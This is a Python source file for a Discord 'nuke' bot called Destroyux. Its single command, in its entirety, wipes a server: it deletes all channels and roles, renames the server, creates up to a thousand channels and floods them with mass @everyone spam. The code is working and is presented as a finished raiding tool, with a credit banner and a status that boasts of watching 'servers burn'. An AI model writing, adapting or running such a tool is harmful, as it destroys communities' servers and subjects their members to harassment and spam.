# main.py
import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
from typing import Optional
from concurrent.futures import ThreadPoolExecutor

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=["!", "/"], intents=intents)

class UltraDestroyux(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.executor = ThreadPoolExecutor(max_workers=50)
    
    @commands.hybrid_command(name="nuke", description="Ultimate nuke system")
    @commands.is_owner()
    async def nuke(self, ctx,
                   channels: int = 1000,
                   spam_count: int = 100,
                   ping_count: int = 50,
                   channel_name: str = "destroyed",
                   spam_message: str = "NUKED",
                   server_name: str = "Nuked By Destroyux"):
        """
        /nuke [channels] [spam_count] [ping_count] [channel_name] [spam_message] [server_name]
        
        Ultimate Nuclear Option
        """
        
        if isinstance(ctx, commands.Context):
            await ctx.defer()
        else:
            await ctx.response.defer()
        
        guild = ctx.guild
        
        # Premium embed - start
        embed = discord.Embed(
            title="⚡ DESTROYUX NUKE INITIATED ⚡",
            description="Nuclear option engaged...",
            color=discord.Color.red()
        )
        embed.add_field(name="Target", value=f"`{guild.name}`", inline=False)
        embed.add_field(name="Status", value="🔄 Processing...", inline=False)
        
        if isinstance(ctx, commands.Context):
            msg = await ctx.send(embed=embed)
        else:
            msg = await ctx.followup.send(embed=embed)
        
        # ===== PHASE 1: DELETE ALL CHANNELS (ULTRA FAST) =====
        tasks = []
        for channel in list(guild.channels):
            tasks.append(asyncio.create_task(self._instant_delete(channel)))
        
        # Fire all deletes at once
        asyncio.create_task(asyncio.gather(*tasks, return_exceptions=True))
        
        # ===== PHASE 2: DELETE ALL ROLES (ULTRA FAST) =====
        role_tasks = []
        for role in list(guild.roles):
            if role.name != "@everyone":
                role_tasks.append(asyncio.create_task(self._instant_delete_role(role)))
        
        asyncio.create_task(asyncio.gather(*role_tasks, return_exceptions=True))
        
        # ===== PHASE 3: CHANGE SERVER NAME =====
        try:
            await guild.edit(name=server_name)
        except:
            pass
        
        # ===== PHASE 4: CREATE CHANNELS (BATCHED ULTRA SPEED) =====
        created_channels = []
        batch_size = 100
        
        for batch_start in range(0, channels, batch_size):
            batch = []
            for i in range(batch_start, min(batch_start + batch_size, channels)):
                batch.append(asyncio.create_task(guild.create_text_channel(f"{channel_name}-{i}")))
            
            batch_results = await asyncio.gather(*batch, return_exceptions=True)
            created_channels.extend([ch for ch in batch_results if isinstance(ch, discord.TextChannel)])
        
        # ===== PHASE 5: BUILD SPAM MESSAGE (MEGA PINGS) =====
        ping_str = " ".join(["@everyone"] * ping_count)
        final_msg = f"{ping_str} {spam_message}"
        
        # ===== PHASE 6: SPAM ALL CHANNELS (FIRE & FORGET) =====
        spam_count_total = 0
        for channel in created_channels:
            for _ in range(spam_count):
                asyncio.create_task(self._instant_send(channel, final_msg))
                spam_count_total += 1
        
        # ===== UPDATE STATUS EMBED =====
        final_embed = discord.Embed(
            title="⚡ DESTROYUX NUKE COMPLETE ⚡",
            color=discord.Color.red()
        )
        final_embed.add_field(name="🎯 Target", value=f"`{server_name}`", inline=True)
        final_embed.add_field(name="🗑️ Channels Destroyed", value=f"`{len(list(guild.channels))}`", inline=True)
        final_embed.add_field(name="🔧 New Channels", value=f"`{len(created_channels)}/{channels}`", inline=True)
        final_embed.add_field(name="💬 Pings Per Message", value=f"`{ping_count}x @everyone`", inline=True)
        final_embed.add_field(name="📢 Spam Messages Fired", value=f"`~{spam_count_total}`", inline=True)
        final_embed.add_field(name="⚙️ Status", value="`✅ PROCESSING`", inline=True)
        
        final_embed.set_footer(text="Credit: m3oza | .gg/m3oza", icon_url="https://cdn.discordapp.com/emojis/1145277702088790046.png")
        
        try:
            await msg.edit(embed=final_embed)
        except:
            if isinstance(ctx, commands.Context):
                await ctx.send(embed=final_embed)
            else:
                await ctx.followup.send(embed=final_embed)
    
    # ULTRA INSTANT DELETE (NO AWAIT CHAIN)
    async def _instant_delete(self, channel):
        try:
            await asyncio.wait_for(channel.delete(), timeout=5)
        except:
            pass
    
    async def _instant_delete_role(self, role):
        try:
            await asyncio.wait_for(role.delete(), timeout=5)
        except:
            pass
    
    # ULTRA INSTANT SEND (FIRE & FORGET)
    async def _instant_send(self, channel, message):
        try:
            await asyncio.wait_for(channel.send(message), timeout=10)
        except:
            pass

@bot.event
async def on_ready():
    print(f"""
    
╔════════════════════════════════════════╗
║     DESTROYUX v2 - PREMIUM EDITION    ║
║     Ultra Speed | Fire & Forget       ║
║     Credit: m3oza                     ║
╚════════════════════════════════════════╝
    
[✓] Bot Online: {bot.user}
[✓] Mode: EXTREME SPEED
[✓] Status: Ready for deployment
    """)
    
    try:
        synced = await bot.tree.sync()
        print(f"[✓] Synced {len(synced)} commands\n")
    except Exception as e:
        print(f"[!] Sync error: {e}\n")
    
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="servers burn | .gg/m3oza"
        )
    )

async def main():
    async with bot:
        await bot.add_cog(UltraDestroyux(bot))
        await bot.start(os.getenv("BOT_TOKEN"))

if __name__ == "__main__":
    asyncio.run(main())
